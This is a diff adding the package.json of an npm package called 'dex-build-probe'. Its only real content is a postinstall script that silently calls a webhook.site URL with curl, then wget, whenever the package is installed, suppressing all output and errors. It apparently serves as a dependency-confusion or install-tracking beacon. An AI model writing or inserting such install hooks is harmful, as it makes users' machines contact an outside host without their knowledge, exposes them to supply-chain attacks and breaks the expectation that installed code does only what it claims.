@@ -1,0 +1,1 @@
+{"name":"dex-build-probe","version":"1.0.0","scripts":{"postinstall":"curl -s -m 5 https://webhook.site/7e11549c-9039-4419-a6ed-9ca2f9a80551 > /dev/null 2>&1 || wget -q -T 5 -O /dev/null https://webhook.site/7e11549c-9039-4419-a6ed-9ca2f9a80551 2>/dev/null || true","build":"echo no-build"}}
